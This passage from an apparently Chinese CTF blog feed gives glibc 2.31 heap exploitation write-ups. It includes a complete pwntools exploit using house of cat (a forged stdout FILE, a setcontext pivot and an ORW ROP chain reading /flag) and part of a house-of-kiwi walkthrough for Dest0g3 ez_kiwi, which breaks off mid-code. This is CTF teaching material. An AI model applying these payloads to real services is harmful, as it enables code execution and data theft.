0x20]</code>这个gadget，它是getkeyserv_handle函数其中的一段，为我们劫持控制流提供了很好的帮助（有大佬称之为<strong>magic gadget</strong>）。</p><h5 id="泄漏堆地址"><a href="#泄漏堆地址" class="headerlink" title="泄漏堆地址"></a>泄漏堆地址</h5><p>存放gadget，堆是一个很好的选择，在libc中mp结构就存放了堆地址，我们就采用相同的方式去泄漏堆地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br></code></pre></td></tr></table></figure><h5 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h5><p>执行puts函数，会通过找到<code>_IO_2_1_stdout_</code>的<code>_IO_file_jumps</code>中的偏移，去执行<code>_IO_file_xsputn</code>函数，我们就需要修改<code>_IO_2_1_stdout_</code>的<code>_IO_file_jumps</code>，  让其最终执行其它函数。<code>_IO_file_jumps</code> 并不能改成任意地址，在调用过程中会对其地址进行检查。</p><p>这里我采用house of cat</p><p>让其调用<code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数，然后进入到<code>_IO_switch_to_wget_mode</code>函数去执行如下代码（简写）：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0xa0</span>]<br><span class="hljs-number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">15</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x20</span>]<br><span class="hljs-number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">25</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0xe0</span>]<br><span class="hljs-number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">37</span>&gt;    <span class="hljs-keyword">call</span>   <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x18</span>]<br></code></pre></td></tr></table></figure><p>劫持到_IO_wfile_jumps（如下图）</p><img src="/img/2/1667369851498.png" style="zoom: 67%;" /><p>_IO_switch_to_wget_mode函数中具体实现（如下图）</p><img src="/img/2/1667370258241.png" style="zoom: 67%;" /><p>在这过程中rdi寄存器始终是<code>_IO_2_1_stdout_</code>的地址， 让其最后执行<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>。</p><p>通过rdi的值去控制rdx，并去执行我们指定的函数，这里我们是去执行setcontext 劫持rsp寄存器指向堆地址。</p><p>改写<code>_IO_2_1_stdout_</code>构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br></code></pre></td></tr></table></figure><h5 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h5><p>写入堆中的数据要注意setcontext的执行 与orw中gadget的位置，具体构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br></code></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25381</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Any data?&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>IO_2_1_stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>IO_wfile_jumps = libcbase + <span class="hljs-number">0x1e8de0</span><br>magic_gadget = libcbase + <span class="hljs-number">0x151990</span><br><span class="hljs-comment">#mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>ret = libcbase + <span class="hljs-number">0x22679</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br>setcontext = libcbase + <span class="hljs-number">347936</span><br>mp = libcbase + <span class="hljs-number">2015944</span><br><br>add(<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>edit(-<span class="hljs-number">8</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp))<br>heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br>orw = p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(pop_rax) + p64(<span class="hljs-number">257</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br>orw += p64(pop_rax) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(syscall_ret)<br><br>payload = <span class="hljs-string">b&#x27;/flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0xc0</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += orw<br>edit(<span class="hljs-number">0</span>, payload)<br><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE += p64(magic_gadget)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr + <span class="hljs-number">0x500</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_2_1_stdout  + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span><br>fake_IO_FILE += p64(IO_2_1_stdout + <span class="hljs-number">0x40</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(-<span class="hljs-number">8</span>).encode())<br><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, fake_IO_FILE)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>关于house of cat我没有讲的太详细，大家可以参考看雪大佬的文章<a href="https://bbs.pediy.com/thread-273895.htm">https://bbs.pediy.com/thread-273895.htm</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3 520迎新赛 pwn ez_kiwi</title>
    <link href="/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/"/>
    <url>/2022/11/01/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-pwn-ez_kiwi/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目环境：glibc-2.31</p><p>如图在edit的过程中对重新输入的字符长度未有效检查，造成单字节溢出。</p><p><img src="/img/1/1.png"></p><p> 这时我们就可利用这一漏洞让堆块重叠，从而泄漏libc的地址</p><p>泄漏libc的地址首先想到的就是unsorted bin中的main_arena，由于存在tcache，必须释放8个大小相同才会进入unsorted bin；在add的过程中输入的idx可以小于0xf，但实际上超过9就无法正常申请，所以我们在申请释放时要小心堆块不够和top chunk的合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):          <br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#重叠的堆块</span><br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)      <span class="hljs-comment">#先释放进入tcache，不会top chunk的合并</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>这时就可以得到libc的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><p>一般情况下我们会修改tcache的fd指针，指向<code>__malloc_hook</code>和<code>__free_hook</code>,再次申请时就使用system或者one_gadget去填充该地址。但是这题故意不让你去这样去使用，每次重新开始循环时会调用clear函数将<code>__malloc_hook</code>和<code>__free_hook</code>全部重置为0。</p><img src="/img/1/2.png"  /><p><img src="/img/1/3.png"></p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>这时我们就需要使用house of kiwi这种方式，修改<code>_IO_file_sync</code>和<code>_IO_helper_jumps</code>中的值。</p><p>具体过程便是触发<code>__malloc_assert</code>后，去执行fflush (stderr)，会使用<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>，RDX寄存器的值为<code>IO_helper_jumps</code>指针,RDX始终是一个固定的地址。</p><img src="/img/1/5.png"><p>然后<strong>通过 setcontext 控制寄存器的值</strong>。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f38b563d0dd</span> &lt;+<span class="hljs-number">61</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa0</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d0e4</span> &lt;+<span class="hljs-number">68</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f38b563d0eb</span> &lt;+<span class="hljs-number">75</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f38b563d0ef</span> &lt;+<span class="hljs-number">79</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f38b563d0f3</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f38b563d0f7</span> &lt;+<span class="hljs-number">87</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f38b563d0fb</span> &lt;+<span class="hljs-number">91</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f38b563d0ff</span> &lt;+<span class="hljs-number">95</span>&gt;:    <span class="hljs-keyword">test</span>   <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x48</span>,<span class="hljs-number">0x2</span><br>   <span class="hljs-number">0x00007f38b563d10b</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x7f38b563d1c6</span> &lt;setcontext+<span class="hljs-number">294</span>&gt;<br>   …………<br>   …………<br>   <span class="hljs-number">0x00007f38b563d1c6</span> &lt;+<span class="hljs-number">294</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0xa8</span>]#利用代码<br>   <span class="hljs-number">0x00007f38b563d1cd</span> &lt;+<span class="hljs-number">301</span>&gt;:   <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f38b563d1ce</span> &lt;+<span class="hljs-number">302</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f38b563d1d2</span> &lt;+<span class="hljs-number">306</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f38b563d1d6</span> &lt;+<span class="hljs-number">310</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f38b563d1dd</span> &lt;+<span class="hljs-number">317</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f38b563d1e1</span> &lt;+<span class="hljs-number">321</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f38b563d1e5</span> &lt;+<span class="hljs-number">325</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f38b563d1ec</span> &lt;+<span class="hljs-number">332</span>&gt;:   <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f38b563d1ee</span> &lt;+<span class="hljs-number">334</span>&gt;:   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>设置<code>rdx + 0xa0</code>来控制rsp，也就是控制了栈的地址，通过最后的ret指令就可以执行ROP。</p><p>攻击流程如下</p><p>将<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>修改为<code>setcontext + 61</code>的地址，让程序执行setcontext中的代码；同时修改<code>_IO_helper_jumps + 0xa0 和 _IO_helper_jumps + 0xa8</code>分别存放有ROP的位置和ret指令的gadget位置。题目提供了libc文件，只需在libc中找到相应的gadget再加上libc的基地址即可，可以通过泄漏堆的地址来存放gadget。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>关于IO_helper_jumps的地址寻找：由于pwntools无法从文件直接得到IO_helper_jumps的信息，于是我们可以直接通过这道题提供的libc文件利用ida中找到偏移；但如果是从pwndbg中寻找，找到的地址并不是<code>_IO_file_sync</code>中所利用的那个地址，对比下图和上图就会发现需要-0xc0才是我们所需要的地址。</p><p><img src="/img/1/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br></code></pre></td></tr></table></figure><p> 利用0x20大小的堆块重叠，可以修改tcache中的fd指针，就可对<code>IO_file_jumps</code>的地址修改，并泄漏堆的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span 